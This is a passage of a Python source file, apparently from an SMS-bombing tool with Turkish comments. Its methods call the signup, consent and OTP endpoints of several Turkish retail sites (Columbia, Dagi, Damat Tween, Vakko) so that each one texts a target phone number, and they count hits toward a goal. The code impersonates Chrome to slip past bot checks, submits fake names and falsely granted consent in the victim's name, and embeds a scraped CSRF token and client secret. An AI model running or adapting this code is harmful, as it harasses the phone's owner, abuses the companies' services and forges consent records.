                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Cacharel Başarılı! (202) --> {self.phone}")
                return True
            else:
                return False
        except:
            return False
        
    def columbia(self):
        if self.adet >= self.hedef:
            return True
        try:
            # Columbia numaranın başında 0 olmasını ister (05xx şeklinde)
            p = self.phone
            if not p.startswith("0"):
                p = "0" + p
            
            # 1. ADIM: Mail kontrolü (Session/Cookie hazırlığı ve session başlatmak için)
            check_url = f"https://www.columbia.com.tr/api/customer/customerCheck?email={self.mail}"
            headers_check = {
                "accept": "application/json, text/plain, */*",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
                "x-source": "Web"
            }
            # İlk isteği atıyoruz
            crequests.post(check_url, headers=headers_check, impersonate="chrome124", timeout=10)

            # 2. ADIM: Asıl SMS tetikleyici (Permission Set)
            url = "https://www.columbia.com.tr/api/customer/customerPostCustomerPolicySetPermission"
            headers_api = {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json;charset=UTF-8",
                "origin": "https://www.columbia.com.tr",
                "referer": "https://www.columbia.com.tr/auth?action=register",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
                "x-source": "Web"
            }
            
            payload = {
                "firstName": "melek",
                "lastName": "aksoy",
                "email": self.mail,
                "phone": p,
                "smsPermission": True,
                "emailPermission": False,
                "SharePermission": True,
                "KvkkPermission": True,
                "CallPermission": False,
                "IsConsentTextConfirmed": True
            }

            # İsteği TLS Bypass ile gönderiyoruz
            r = crequests.post(url, json=payload, headers=headers_api, impersonate="chrome124", timeout=12)
            
            # Başarılı durumda 200, 201 veya 202 dönebilir
            if r.status_code in [200, 201, 202]:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Columbia Başarılı! --> {self.phone}")
                return True
            else:
                return False
        except:
            return False

    def dagi(self):
        if self.adet >= self.hedef:
            return True
        try:
            # Dagi 90 ile başlayan 12 haneli numara ister (905xx...)
            p = self.phone
            if not p.startswith("90"):
                p = "90" + p
            
            # 1. ADIM: Müşteri Durum Kontrolü (Session başlatmak için iyi olur)
            check_url = "https://www.dagi.com.tr/apps/holly-account/Shopify/check-customer-status"
            headers_check = {
                "accept": "*/*",
                "content-type": "application/json",
                "origin": "https://www.dagi.com.tr",
                "referer": "https://www.dagi.com.tr/account/register",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
            }
            payload_check = {"Email": self.mail}
            crequests.post(check_url, json=payload_check, headers=headers_check, impersonate="chrome124", timeout=10)

            # 2. ADIM: OTP (SMS) Üretme/Gönderme
            url = "https://www.dagi.com.tr/apps/holly-account/otp/generate"
            headers_api = {
                "accept": "*/*",
                "content-type": "application/json",
                "origin": "https://www.dagi.com.tr",
                "referer": "https://www.dagi.com.tr/account/register",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
            }
            
            payload_api = {
                "phoneNumber": p
            }

            # İsteği TLS Bypass ile gönderiyoruz
            r = crequests.post(url, json=payload_api, headers=headers_api, impersonate="chrome124", timeout=12)
            
            # Dagi genellikle 200 döner, yanıt içeriğinde "success": true yazar
            if r.status_code in [200, 201, 202]:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Dagi Başarılı! --> {self.phone}")
                return True
            else:
                return False
        except:
            return False
    
    def damat_tween(self):
        if self.adet >= self.hedef:
            return True
        try:
            # Damat Tween 0 ile başlayan 11 haneli numara ister (05xx...)
            p = self.phone
            if not p.startswith("0"):
                p = "0" + p
            
            url = "https://www.damattween.com/users/register/"
            
            # Form-encoded headers (Curl loguna birebir uyumlu)
            headers = {
                "accept": "*/*",
                "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.damattween.com",
                "referer": "https://www.damattween.com/users/register/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
                "x-csrftoken": "Qro2lOq4H16HXLNwy0WWjWhrikHS1eZ0bQQcVCfQxtO6OQguyvKGYIoJcfAzXugu",
                "x-requested-with": "XMLHttpRequest"
            }
            
            # x-www-form-urlencoded formatında veri hazırlıyoruz
            # Not: 'confirm': 'true' parametresi SMS gönderimi için kritiktir.
            data_payload = {
                "email": self.mail,
                "first_name": "memati",
                "last_name": "necler",
                "password": "Rainy0203",
                "phone": p,
                "confirm": "true"
            }

            # TLS Bypass (chrome124) ve form-data gönderimi
            # 'data' parametresi kullanıldığında curl_cffi içeriği form-urlencoded yapar
            r = crequests.post(
                url, 
                data=data_payload, 
                headers=headers, 
                impersonate="chrome124", 
                timeout=12
            )
            
            # Başarılı kayıt/istek durumunda 200 veya 201/202 döner
            if r.status_code in [200, 201, 202]:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Damat Tween Başarılı! --> {self.phone}")
                return True
            else:
                return False
        except:
            return False

    def vakko(self):
        if self.adet >= self.hedef:
            return True
        try:
            # 1. ADIM: OAuth Token Al (Bearer Token)
            auth_url = "https://api.vakko.com/authorizationserver/oauth/token"
            auth_headers = {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.vakko.com",
                "referer": "https://www.vakko.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
            }
            auth_data = "client_id=r_client-side&client_secret=eyqvpCjoN9dlUBbO6fLWuZ&grant_type=client_credentials"
            
            auth_res = crequests.post(auth_url, data=auth_data, headers=auth_headers, impersonate="chrome124", timeout=10)
            token = auth_res.json().get("access_token")
            
            if not token:
                return False

            # 2. ADIM: Kayıt İsteyi Gönder (SMS Tetikleyici)
            # Vakko numaranın başında 0 olmadan 10 hane ister
            p = self.phone[-10:]
            
            url = "https://api.vakko.com/occ/v2/vsite/users?fields=DEFAULT&lang=tr&curr=TRY"
            headers = {
                "accept": "application/json, text/plain, */*",
                "authorization": f"Bearer {token}",
                "content-type": "application/json",
                "origin": "https://www.vakko.com",
                "referer": "https://www.vakko.com/",
                "platform": "WEB",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
            }
            
            payload = {
                "firstName": "MEMATİ",
                "lastName": "AKSOY",
                "uid": self.mail,
                "password": "Rainy0203",
                "birthdate": "20-03-2002",
                "smsPermit": True,
                "callPermit": False,
                "emailPermit": False,
                "gender": "MALE",
                "phone": p
            }

            r = crequests.post(url, json=payload, headers=headers, impersonate="chrome124", timeout=12)
            
            if r.status_code in [200, 201, 202]:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Vakko Başarılı! --> {self.phone}")
                return True
            else:
                return False
        except:
            return False
